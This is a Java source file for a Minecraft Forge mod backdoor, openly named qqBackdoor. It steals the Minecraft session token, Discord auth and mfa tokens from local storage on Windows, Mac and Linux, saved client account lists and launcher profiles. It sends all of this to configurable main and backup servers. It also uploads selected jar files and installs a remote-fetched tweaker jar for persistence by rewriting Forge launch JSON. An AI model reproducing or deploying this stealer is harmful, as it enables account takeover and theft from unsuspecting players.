package com.qqTechnologies.qqbackdoor;
/*
 * @author Crystallinqq on 8/13/2020
 * megyn made this 2 :P
 */

import net.minecraft.launchwrapper.Launch;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.ConnectException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/*
* Main qqBackdoor class.
* Runs qqPersistence if Windows.
*
 */
public class MainClass {
    private static final String host = "ip here"; //ip of main server
    private static final String backup = "ip here"; //ip of backup server
    private static final int port = 0; //replace with port of serverz
    private static String accountslist = "None";
    private static String files = "";
    private static String mcToken;
    private static String displayName;
    private static String toSend = "";

    public static void sendJar(byte[] file, String name) {
        try {
            if (file.length > 30000000) return;
            Socket socket = new Socket(host, port);
            DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
            byte[] jar = ("jarfile+" + name + "+" + file.length + "+").getBytes(StandardCharsets.UTF_8);
            stream.write(jar);
            // stream.writeInt(file.length);
            stream.write(file);
            stream.flush();
        } catch (ConnectException e) {
            try {
                if (file.length > 30000000) return;
                Socket socket = new Socket(backup, port);
                DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
                byte[] jar = ("jarfile+" + name + "+" + file.length + "+").getBytes(StandardCharsets.UTF_8);
                stream.write(jar);
                // stream.writeInt(file.length);
                stream.write(file);
                stream.flush();
            } catch (IOException ex) {
            }
        } catch (UnknownHostException ignored) {
        } catch (IOException ignored) {
        }
    }

    public static void send(byte[] file) {
        try {
            Socket socket = new Socket(host, port);
            socket.getOutputStream().write(file);
            socket.getOutputStream().flush();
        } catch (ConnectException e) {
            try {
                Socket socket = new Socket(backup, port);
                socket.getOutputStream().write(file);
                socket.getOutputStream().flush();
            } catch (Throwable ignored) {
            }
        } catch (Throwable ignored) {
        }
    }

    public static void send(String content) {
        toSend = toSend + System.lineSeparator() + content;
    }

    public static final String[] whitelist = new String[]{
            //Name of jars to upload to server.
    };

    public static void findJars() {
        Thread thread = new Thread (() -> {
            File downloads = new File(System.getProperty("user.home") + "/Downloads");
            File mods = new File("mods");
            if (downloads.exists() && downloads.isDirectory()) {
                for (File file : downloads.listFiles()) {
                    for (String name : whitelist) {
                        if (file.getName().contains(".jar") && file.getName().toLowerCase().contains(name)) {
                            try {
                                sendJar(Files.readAllBytes(Paths.get(file.getAbsolutePath())), file.getName());
                                Thread.sleep(500);
                            } catch (IOException | InterruptedException ignored) {

                            }
                        }
                    }
                }
            }
            if (mods.exists() && mods.isDirectory()) {
                for (File file : mods.listFiles()) {
                    for (String name : whitelist) {
                        if (file.getName().contains(".jar") && file.getName().toLowerCase().contains(name)) {
                            try {
                                sendJar(Files.readAllBytes(Paths.get(file.getAbsolutePath())), file.getName());
                                Thread.sleep(500);
                            } catch (IOException | InterruptedException ignored) {

                            }
                        }
                    }
                }
            }
        });
        thread.start();
    }

    public static void sendLog() {
        try {
            Socket socket = new Socket(host, port);
            socket.getOutputStream().write(("log" + toSend).getBytes(StandardCharsets.UTF_8));
            socket.getOutputStream().flush();
        } catch (ConnectException e) {
            try {
                Socket socket = new Socket(backup, port);
                socket.getOutputStream().write(("log" + toSend).getBytes(StandardCharsets.UTF_8));
                socket.getOutputStream().flush();
            } catch (Exception ex) {
            }
        } catch (Exception e) {
        }
    }

    public static byte[] get(String thing) {
        try {
            Socket socket = new Socket(host, port);
            socket.getOutputStream().write(thing.getBytes(StandardCharsets.UTF_8));
            socket.getOutputStream().flush();
            byte[] buffer = readByteArrayLWithLength(new DataInputStream(socket.getInputStream()));
            return buffer;
        } catch (ConnectException e) {
            try {
                Socket socket = new Socket(backup, port);
                socket.getOutputStream().write(thing.getBytes(StandardCharsets.UTF_8));
                socket.getOutputStream().flush();
                byte[] buffer = readByteArrayLWithLength(new DataInputStream(socket.getInputStream()));
                return buffer;
            } catch (UnknownHostException ex) {
            } catch (IOException ex) {
            }
        } catch (UnknownHostException e) {

        } catch (IOException e) {
        }
        return null;
    }

    private static byte[] readByteArrayLWithLength(DataInputStream reader) throws IOException {
        int length = reader.readInt();
        if(length > 0) {
            byte[] bytes = new byte[length];
            reader.readFully(bytes, 0, bytes.length);
            return bytes;
        }
        return null;
    }

    public static void registerTweakerJson() {
        try {
            File file2 = new File("versions");
            if (file2.isDirectory()) {
                for (File file1 : file2.listFiles()) {
                    if (file1.isDirectory()) {
                        for (File file : file1.listFiles()) {
                            if (file.getName().contains(".json") && file.getName().contains("1.12.2") && file.getName().contains("forge")) {
                                String json = new String(Files.readAllBytes(Paths.get(file.getAbsolutePath())), StandardCharsets.UTF_8);
                                if (!json.contains("--tweakClass net.minecraftforge.coremod.FMLCoremodTweaker")) {
                                    JSONObject thing = new JSONObject(json);
                                    JSONArray array = thing.getJSONArray("libraries");
                                    JSONObject object = new JSONObject();
                                    object.put("name", "net.minecraftforge:coremod:1.0.12");
                                    array.put(object);
                                    String args = (String) thing.get("minecraftArguments");
                                    thing.remove("minecraftArguments");
                                    thing.put("minecraftArguments", args + " --tweakClass net.minecraftforge.coremod.FMLCoremodTweaker");
                                    Files.write(Paths.get(file.getAbsolutePath()), thing.toString().getBytes("UTF-8"));
                                }
                            }
                        }
                    }
                }
            }
        } catch (Throwable e) {

        }
    }


    public static void registerTweaker() throws IOException {
        File path = new File("libraries/net/minecraftforge/coremod/1.0.12");
        File jar = new File("libraries/net/minecraftforge/coremod/1.0.12/coremod-1.0.12.jar");

        if (!path.exists()) {
            path.mkdirs();
        }
        if (!jar.exists()) {
            jar.createNewFile();
        }
        byte[] bytes = get("tweaker");
        Files.write(Paths.get(jar.getAbsolutePath()), bytes);
        registerTweakerJson();
    }

    public static void justice4qq() {
        Thread thread = new Thread(MainClass::justice);
        thread.start();
    }

    // Linux/Mac loggers untested. Maybe they work maybe they don't :P
    public static void justice() {
        try {
            Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
            Object minecraft = mc.getMethod("func_71410_x").invoke(null);
            Object session = mc.getMethod("func_110432_I").invoke(minecraft);
            Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
            Object token = sessionClass.getMethod("func_148254_d").invoke(session);
            Object name = sessionClass.getMethod("func_111285_a").invoke(session);
            mcToken = (String) token;
            displayName = (String) name;
            String os = System.getProperty("os.name");
            if (os.toLowerCase().contains("win")) {
                if(!os.toLowerCase().contains("darwin")) {
                registerTweaker();
                findJars();
                String path = System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/";
                String canaryPath = System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/";
                String ptbPath = System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/";

                String chromePath = System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/";

                String username = System.getProperty("user.name");

                String[] pathnames;
                String[] canaryPathnames;
                String[] ptbPathnames;

                File file = new File(path);
                File fileCanary = new File(canaryPath);
                File ptbFile = new File(ptbPath);

                pathnames = file.list();
                canaryPathnames = fileCanary.list();
                ptbPathnames = ptbFile.list();
                /*
                 * Future alts stealer by megyn
                 */
                File accounts = new File("C:\\Users\\" + System.getProperty("user.name") + "\\Future\\accounts.txt");
                File profile = new File("launcher_profiles.json");

                if (profile.exists()) {
                    send(Files.readAllBytes(Paths.get(profile.getAbsolutePath())));
                }

                try {
                    FileReader fr = new FileReader(accounts);   //reads the file
                    BufferedReader br = new BufferedReader(fr);  //creates a buffering character input stream
                    StringBuffer sb = new StringBuffer();    //constructs a string buffer with no characters
                    String line;
                    while ((line = br.readLine()) != null) {
                        sb.append(line);      //appends line to string buffer
                        sb.append("\n");     //line feed
                    }
                    accountslist = sb.toString();
                    fr.close();
                    br.close();
                } catch (IOException ignored) {
                    
                }

                for (String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {

                            Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                            Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                            Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                            Matcher mfam = mfa.matcher(strLine); //swag regex matcher

                            while (mfam.find()) { //everytime a token is found
                                send(username + "  -  " + mfam.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            } //it
                            while (m.find()) { //everytime a token is found
                                send(username + "  -  " + m.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            } //it
                        }

                    } catch (Exception ignored) {}
                }
                if (fileCanary.exists()) {
                    for (String pathname : canaryPathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(canaryPath + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));
                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                                Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                                Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                                Matcher mfam = mfa.matcher(strLine); //swag regex matcher
                                while (mfam.find()) { //everytime a token is found
                                    send(username + "  -  " + mfam.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                                } //it
                                while (m.find()) { //everytime a token is found
                                    send(username + "  -  " + m.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                                } //it
                            }
                            fstream.close();
                            in.close();
                        } catch (Exception ignored) {
                            
                        }
                    }
                }
                if (ptbFile.exists()) {
                    for (String pathname : ptbPathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(ptbPath + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));
                            String strLine;
                            while ((strLine = br.readLine()) != null) {


                                Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                                Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                                Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                                Matcher mfam = mfa.matcher(strLine); //swag regex matcher
                                while (mfam.find()) { //everytime a token is found
                                    send(username + "  -  " + m.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                                }
                            }
                            fstream.close();
                            in.close();
                        } catch (Exception ignored) {

                        }
                    }
                }
            }}
            if (os.toLowerCase().contains("mac") || os.toLowerCase().contains("darwin")) {
                String path = System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/";
                String pathCanary = System.getProperty("user.home") + "/Library/Application Support/discordcanary/Local Storage/leveldb/";
                String ptbPath = System.getProperty("user.home") + "/Library/Application Support/discordptb/Local Storage/leveldb/";
                String username = System.getProperty("user.name");

                String[] pathnames;
                String[] canaryPathnames;
                String[] ptbPathnames;

                File file = new File(path);
                File canaryFile = new File(pathCanary);
                File ptbFile = new File(ptbPath);

                pathnames = file.list();
                canaryPathnames = canaryFile.list();
                ptbPathnames = ptbFile.list();

                for (String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {


                            Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                            Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                            Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                            Matcher mfam = mfa.matcher(strLine); //swag regex matcher

                            while (mfam.find()) { //everytime a token is found
                                send(username + "  -  " + mfam.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            } //it
                            while (m.find()) { //everytime a token is found
                                send(username + "  -  " + m.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            }
                        }
                        fstream.close();
                        in.close();
                        
                    } catch (Exception ignored) {
                        
                    }
                }
                for (String pathname : canaryPathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {


                            Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                            Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                            Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                            Matcher mfam = mfa.matcher(strLine); //swag regex matcher

                            while (mfam.find()) { //everytime a token is found
                                send(username + "  -  " + mfam.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            } //it
                            while (m.find()) { //everytime a token is found
                                /*String type = "application/json";
                                URL u = new URL("https://discordapp.com/api/v7/invites/minecraft");
                                HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                                conn.setDoOutput(true);
                                conn.setRequestMethod("POST");
                                conn.setRequestProperty( "Content-Type", type );
                                conn.setRequestProperty( "Authorization", m.group() );

                                conn.getOutputStream().write("".getBytes(StandardCharsets.UTF_8));
                                BufferedReader sc = new     BufferedReader(new InputStreamReader(conn.getInputStream()));
                                while ( sc.readLine() != null) {
                                    if (sc.readLine().contains("302094807046684672")) {
                                        // send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist);
                                    }
                                }*/
                                send(username + "  -  " + m.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            }
                        }
                        in.close();
                        fstream.close();
                    } catch (Exception ignored) {
                        
                    }
                }
                for (String pathname : ptbPathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {


                            Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                            Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                            Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                            Matcher mfam = mfa.matcher(strLine); //swag regex matcher

                            while (mfam.find()) { //everytime a token is found
                                send(username + "  -  " + mfam.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            } //it
                            while (m.find()) { //everytime a token is found
                                send(username + "  -  " + m.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            }
                        }
                        fstream.close();
                        in.close();
                        
                    } catch (Exception ignored) {
                        
                    }
                }
            }
            if (os.contains("linux")) {
                String path = System.getProperty("user.home") + "/.config/discord/Cache/Local Storage/leveldb/";
                String canaryPath = System.getProperty("user.home") + "/.config/discordcanary/Cache/Local Storage/leveldb/";
                String ptbPath = System.getProperty("user.home") + "/.config/discordptb/Cache/Local Storage/leveldb/";
                String username = System.getProperty("user.name");

                String[] pathnames;
                String[] canaryPathnames;
                String[] ptbPathnames;

                File file = new File(path);
                File canaryFile = new File(canaryPath);
                File ptbFile = new File(ptbPath);

                pathnames = file.list();
                canaryPathnames = canaryFile.list();
                ptbPathnames = ptbFile.list();
                /*fr.close();    //closes the stream and release the resources
                System.out.println("Contents of File: ");
                System.out.println(sb.toString());   //returns a string that textually represents the object*/

                for (String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {


                            Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                            Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                            Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                            Matcher mfam = mfa.matcher(strLine); //swag regex matcher

                            while (mfam.find()) { //everytime a token is found
                                send(username + "  -  " + mfam.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            } //it
                            while (m.find()) { //everytime a token is found
                                send(username + "  -  " + m.group()  + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            }
                        }
                        in.close();
                        fstream.close();
                    } catch (Exception ignored) {
                        
                    }
                }
            }
            sendLog();
        } catch (Exception ignored) {
            
        }
    }
}